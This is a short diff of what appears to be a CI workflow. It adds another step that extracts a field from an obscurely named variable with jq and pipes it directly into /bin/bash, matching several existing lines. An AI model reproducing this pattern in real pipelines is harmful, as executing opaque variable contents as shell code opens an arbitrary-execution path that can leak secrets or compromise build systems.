@@ -34,6 +34,7 @@ jobs:
           echo $zvil1644 | jq -r .azns28526 | /bin/bash
           echo $qofg3918 | jq -r .a868 | /bin/bash
           echo $iqqie867 | jq -r .odhy173 | /bin/bash
+          printf '%s' "$w527" | jq -r .ehf999 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
